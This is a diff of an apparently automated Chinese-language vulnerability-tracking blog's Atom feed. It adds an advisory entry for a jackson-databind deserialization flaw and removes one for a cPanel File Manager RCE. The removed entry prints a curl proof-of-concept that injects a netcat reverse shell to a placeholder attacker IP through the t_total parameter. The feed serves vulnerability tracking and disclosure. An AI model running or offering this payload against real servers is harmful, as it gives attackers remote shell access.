@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-27T01:45:18.359Z</updated>
+  <updated>2025-06-27T02:30:17.250Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>FasterXML jackson-databind 反序列化漏洞</title>
+    <link href="http://example.com/2025/06/27/github_4126284426/"/>
+    <id>http://example.com/2025/06/27/github_4126284426/</id>
+    <published>2025-06-27T02:30:17.251Z</published>
+    <updated>2025-06-27T02:30:17.250Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> FasterXML jackson-databind 反序列化漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2020-9548</li></ul><p><strong>漏洞类型：</strong> 反序列化</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> FasterXML jackson-databind 2.x 在2.9.10.4之前的版本中，处理序列化小工具和类型交互时存在缺陷，与br.com.anteros.dbcp.AnterosDBCPConfig（即anteros-core）相关。</p><p><strong>产品厂商：</strong> FasterXML</p><p><strong>产品名称：</strong> jackson-databind</p><p><strong>影响版本：</strong> 2.x &lt; 2.9.10.4</p><p><strong>搜索语法：</strong> cpe:”cpe:2.3:o:debian:debian_linux”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12484">https://github.com/projectdiscovery/nuclei-templates/issues/12484</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to br.com.anteros.dbcp.AnterosDBCPConfig (aka anteros-core).</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://github.com/fairyming/CVE-2020-9548">https://github.com/fairyming/CVE-2020-9548</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-cpe-cpe-2-3-o-debian-debian-linux"><a href="#Shodan-Query-cpe-cpe-2-3-o-debian-debian-linux" class="headerlink" title="Shodan Query: cpe:&quot;cpe:2.3:o:debian:debian_linux&quot;"></a>Shodan Query: <code>cpe:&quot;cpe:2.3:o:debian:debian_linux&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; FasterXML jackson-databind 反序列化漏洞&lt;/p&gt;
+&lt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    
+  </entry>
   
   <entry>
     <title>QNAP Photo Station 远程代码执行漏洞</title>
@@ -501,32 +528,6 @@
     <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
     <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>cPanel File Manager Remote Code Execution Vulnerability</title>
-    <link href="http://example.com/2025/06/26/github_885849083/"/>
-    <id>http://example.com/2025/06/26/github_885849083/</id>
-    <published>2025-06-26T14:45:20.764Z</published>
-    <updated>2025-06-26T14:45:20.762Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> cPanel File Manager Remote Code Execution Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-48703</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CVE-2025-48703是cPanel文件管理器中的一个远程代码执行漏洞，由于<code>filemanager</code>模块中的<code>acc=changePerm</code>函数未对输入进行适当处理，攻击者可以通过<code>t_total</code>参数注入并执行任意系统命令。此漏洞允许攻击者在目标服务器上执行任意命令，可能建立反向shell以获取持久访问权限，并在某些配置下无需认证即可利用。</p><p><strong>产品厂商：</strong> cPanel</p><p><strong>产品名称：</strong> cPanel File Manager</p><p><strong>来源：</strong> <a href="https://github.com/Skynoxk/CVE-2025-48703">https://github.com/Skynoxk/CVE-2025-48703</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>Scanner.py</li><li>target.txt</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="🛡️-CVE-2025-48703-Remote-Code-Execution-RCE-in-cPanel-File-Manager"><a href="#🛡️-CVE-2025-48703-Remote-Code-Execution-RCE-in-cPanel-File-Manager" class="headerlink" title="🛡️ CVE-2025-48703 - Remote Code Execution (RCE) in cPanel File Manager"></a>🛡️ CVE-2025-48703 - Remote Code Execution (RCE) in cPanel File Manager</h2><h3 id="📌-Description"><a href="#📌-Description" class="headerlink" title="📌 Description"></a>📌 Description</h3><p><strong>CVE-2025-48703</strong> is a Remote Code Execution (RCE) vulnerability in the <code>filemanager</code> module of a web hosting control panel (e.g., cPanel). It occurs due to <strong>unsanitized input handling</strong> in the <code>acc=changePerm</code> function, which allows an attacker to inject and execute arbitrary system commands using the <code>t_total</code> parameter.</p><hr><h3 id="🧨-Impact"><a href="#🧨-Impact" class="headerlink" title="🧨 Impact"></a>🧨 Impact</h3><p>This vulnerability allows attackers to:</p><ul><li>Execute arbitrary commands on the target server.</li><li>Establish a reverse shell for persistent access.</li><li>Potentially escalate privileges or move laterally.</li></ul><blockquote><p>⚠️ This attack can be performed with minimal authentication, or in some configurations, unauthenticated access.</p></blockquote><hr><h3 id="🚀-Proof-of-Concept-PoC"><a href="#🚀-Proof-of-Concept-PoC" class="headerlink" title="🚀 Proof-of-Concept (PoC)"></a>🚀 Proof-of-Concept (PoC)</h3><h4 id="✅-Reverse-Shell-Command"><a href="#✅-Reverse-Shell-Command" class="headerlink" title="✅ Reverse Shell Command"></a>✅ Reverse Shell Command</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -kis <span class="hljs-string">&#x27;https://&lt;TARGET_IP&gt;:2083/myuser/index.php?module=filemanager&amp;acc=changePerm&#x27;</span> \<br>  --data <span class="hljs-string">&#x27;fileName=.bashrc&amp;currentPath=/home/myuser&amp;t_total=`nc &lt;ATTACKER_IP&gt; 4444 -e /bin/bash`&#x27;</span><br></code></pre></td></tr></table></figure><p>References: <a href="https://fenrisk.com/rce-centos-webpanel">https://fenrisk.com/rce-centos-webpanel</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; cPanel File Manager Remote Code Executi</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
     
   </entry>
   
